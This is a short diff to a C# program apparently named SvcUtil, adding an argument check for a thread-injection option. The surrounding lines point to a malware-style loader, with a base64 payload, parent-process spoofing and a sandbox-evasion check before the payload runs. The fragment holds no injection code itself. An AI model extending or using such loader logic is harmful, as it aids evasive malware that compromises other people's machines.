@@ -54,6 +54,12 @@ namespace SvcUtil
             if (!ParseArgs(args))
                 return;
 
+#if INJECT
+            // --thread-inject only makes sense with a remote target
+            if (_useThreadInject && _targetPid == 0 && _ppidSpoof == 0)
+                return;
+#endif
+
             if (_payloadB64 != null)
             {
                 if (!_noSandbox && !Env.Go())
